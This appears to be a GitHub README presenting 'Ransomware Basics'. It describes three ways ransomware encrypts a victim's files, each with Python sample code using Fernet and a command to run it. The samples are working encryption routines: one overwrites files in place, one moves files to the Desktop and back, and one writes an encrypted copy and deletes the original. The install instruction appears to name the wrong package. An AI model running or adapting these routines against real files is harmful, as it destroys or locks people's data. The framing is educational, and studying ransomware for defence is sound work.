# Ransomware Basics

## How to install dependencies
``` 
python -m pip install fernet
```
## Category 1 
This type of ransomware opens a file, reads the contents and then writes the encryption into the file, thus overwriting it. This means that the content of the file is encrypted, but not necessarily the file itself, the file might not even be renamed.

#### Running Category 1
``` 
python cat1.py
```

#### [Sample](https://github.com/JACTheCreator/RansomwareBasics/blob/master/cat1.py)
```python
def encrypt_file(key, file_name):
    with open(file_name, 'rb') as f:
        plain_text = f.read()
    cipher_suite = Fernet(key)
    cipher_text = cipher_suite.encrypt(plain_text)

    with open(file_name, 'wb') as f:
        f.write(cipher_text)
```

#### Result
Coming soon

## Category 2 
The file to be encrypted is moved to another directory where the ransomware encrypts the file, then moves the same file back into the original directory. Here the file might also be renamed.

#### Running Category 2
``` 
python cat2.py
```

#### [Sample](https://github.com/JACTheCreator/RansomwareBasics/blob/master/cat2.py)
```python
def encrypt_file(key, file_name):
    new_file_location = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop') 
    new_file_location_path = new_file_location + '\\' + os.path.basename(file_name)
    os.rename(os.path.abspath(file_name), new_file_location_path)

    with open(new_file_location_path, 'rb') as f:
        plain_text = f.read()
    
    cipher_suite = Fernet(key)
    cipher_text = cipher_suite.encrypt(plain_text)

    with open(new_file_location_path, 'wb') as f:
        f.write(cipher_text)
    
    os.rename(new_file_location_path, os.path.abspath(file_name))
```

#### Result
Coming soon

## Category 3 
Here the original file is read and a new encrypted file is made based on the original, next the original is overwritten or deleted

#### Running Category 3
``` 
python cat3.py
```

#### [Sample](https://github.com/JACTheCreator/RansomwareBasics/blob/master/cat3.py)
```python
def encrypt_file(key, file_name):
    encrypted_file_name = os.path.splitext(file_name)[0] + '_encrypted' + os.path.splitext(file_name)[1]
    with open(file_name, 'rb') as f:
        with open(encrypted_file_name, 'wb') as f_enc:
            plain_text = f.read()
            f_enc.write(plain_text)

    cipher_suite = Fernet(key)
    cipher_text = cipher_suite.encrypt(plain_text)

    with open(encrypted_file_name, 'wb') as f:
        f.write(cipher_text)
    
    os.remove(file_name)
```

#### Result
Coming soon
